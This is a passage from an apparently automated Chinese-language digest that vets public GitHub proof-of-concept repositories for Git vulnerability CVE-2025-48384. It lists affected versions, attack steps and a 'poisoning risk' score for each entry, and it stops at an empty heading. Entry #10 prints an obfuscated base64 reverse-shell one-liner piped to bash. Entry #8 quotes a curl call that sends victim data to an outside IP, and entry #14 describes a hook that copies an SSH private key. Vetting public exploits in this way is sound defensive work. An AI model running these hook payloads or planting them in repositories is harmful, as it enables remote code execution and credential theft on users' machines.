提供的POC代码是有效的，因为它展示了如何创建一个触发漏洞的`post-checkout` hook脚本。尽管脚本本身的功能很简单，但可以替换为任何恶意代码。

**投毒风险：**
该仓库中存在作者隐藏的投毒代码的风险较低，估计为10%。当前提供的脚本只是一个简单的测试脚本，用于验证漏洞的存在。但是，攻击者可能会在更复杂的仓库中隐藏更高级的恶意代码，使其更难被检测到。该风险评估基于提供的信息，实际风险可能因仓库的具体内容而有所不同。

**项目地址:** [admin-ping/CVE-2025-48384-RCE](https://github.com/admin-ping/CVE-2025-48384-RCE)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git Config 注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库，并初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 对配置项中回车符（CR）处理不当。具体来说，当 Git 读取配置值时，会去除尾部的 CRLF。但当写入配置项时，如果值包含尾部 CR，则不会被引用，导致 CR 在后续读取时丢失。这个漏洞可以被利用于子模块初始化过程中。如果子模块的路径包含尾部 CR，修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，那么在检出后，该脚本可能会被意外执行，从而导致任意代码执行。

**POC 分析：**

提供的 POC 包含以下文件：

*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/README.md`：一个普通的 README 文件，可能用于描述 PoC 的用途。
*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/post-checkout`：一个 bash 脚本，当子模块检出后会被执行。脚本的功能很简单，就是创建一个 `/tmp/fishsucks` 文件。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件中的子模块路径包含尾部 CR。
2.  攻击者在该仓库中创建一个子模块，并在该子模块的 `.git/hooks` 目录下放置一个名为 `post-checkout` 的可执行脚本（如提供的POC）。
3.  攻击者创建一个符号链接，将包含尾部 CR 的子模块路径指向该子模块的 `.git/hooks` 目录。
4.  受害者克隆该仓库，并执行 `git submodule init` 和 `git submodule update` 命令。
5.  由于 Git 对尾部 CR 的处理不当，子模块会被检出到错误的位置，并且 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**有效性：**

根据漏洞描述和 POC 代码，该 POC 是有效的。它可以利用 Git 的配置解析漏洞，在受害者机器上执行任意代码。

**投毒风险：**

该POC的目的是创建一个`/tmp/fishsucks`文件,根据POC内容来看，此代码的目的是演示该漏洞，没有发现隐藏的恶意代码，因此投毒风险较低，可以认为是 0%。

**项目地址:** [beishanxueyuan/CVE-2025-48384](https://github.com/beishanxueyuan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过构造特殊的 Git 配置文件，在受害者克隆或初始化子模块时执行任意代码。漏洞的根源在于 Git 对配置项中尾部回车符（CR）处理不当。当 Git 读取配置值时，会删除尾部的 CRLF，但写入时，如果值以 CR 结尾，则不会进行引号处理，导致 CR 在后续读取时丢失。如果子模块路径包含尾部 CR，这会导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的 POC 代码 `/tmp/4ddcea7dd1399c323a9fb7a8b3071e04/README.md` 本身并不能直接验证漏洞，它只是一个简单的说明文件。真正的 POC 应该包含能够触发漏洞的恶意 Git 仓库配置和子模块结构。从搜索结果来看，存在可用的 POC。

**投毒风险：**

提供的 README.md 文件本身不包含任何可执行代码，因此直接的投毒风险较低。但是，如果该仓库中存在其他文件（例如恶意的 `.gitmodules` 文件或者钩子脚本），则存在投毒的风险。假设仓库作者在其他文件中隐藏了恶意代码的可能性存在，估计投毒风险为 10%。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含特殊构造的 `.gitmodules` 文件和恶意的子模块钩子脚本的 Git 仓库。
2.  **.gitmodules 构造：**  `.gitmodules` 文件中的子模块路径包含尾部回车符（CR），例如 `path = submodule_path\r`。
3.  **符号链接：** 创建一个符号链接，将 `submodule_path` 指向 `.git/modules/<submodule_name>/hooks`。
4.  **恶意钩子：** 子模块中包含一个 `post-checkout` 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户：** 攻击者诱骗受害者克隆该恶意仓库并初始化子模块（使用 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`）。
6.  **触发漏洞：** 当 Git 初始化子模块时，由于路径中的回车符被错误处理，子模块会被检出到错误的位置。由于存在符号链接，`post-checkout` 钩子会被执行，从而导致任意代码执行。

**项目地址:** [eliox01/CVE-2025-48384](https://github.com/eliox01/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384-Git配置注入与任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库或者提交包含恶意配置的patch

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

